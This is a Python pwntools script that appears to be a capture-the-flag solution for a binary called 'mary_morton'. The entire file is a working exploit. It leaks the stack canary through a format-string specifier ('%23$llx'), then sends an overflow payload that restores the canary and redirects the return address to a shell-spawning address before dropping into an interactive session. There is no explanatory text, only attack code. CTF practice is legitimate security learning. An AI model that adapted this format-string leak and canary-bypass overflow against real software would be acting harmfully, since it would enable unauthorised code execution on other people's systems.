from pwn import *

TARGET = "./mary_morton"
context.log_level = "debug"


def leak_canary(target_io):
  target_io.recvuntil(b"3. Exit the battle \n")
  target_io.sendline(b"2")
  target_io.sendline(b"%23$llx")
  leak_bytes = target_io.recvline()
  return int(leak_bytes, 16)


def exec_bin_sh(target_io, canary):
  payload = b"0" * (0x98 - 0x10)
  payload += p64(canary)
  payload += b"1" * 8
  payload += p64(0x4008da)
  target_io.recvuntil(b"3. Exit the battle \n")
  target_io.sendline(b"1")
  target_io.sendline(payload)


def main():
  target_io = process(TARGET)
  canary = leak_canary(target_io)
  exec_bin_sh(target_io, canary)
  target_io.interactive()


if __name__ == "__main__":
  main()
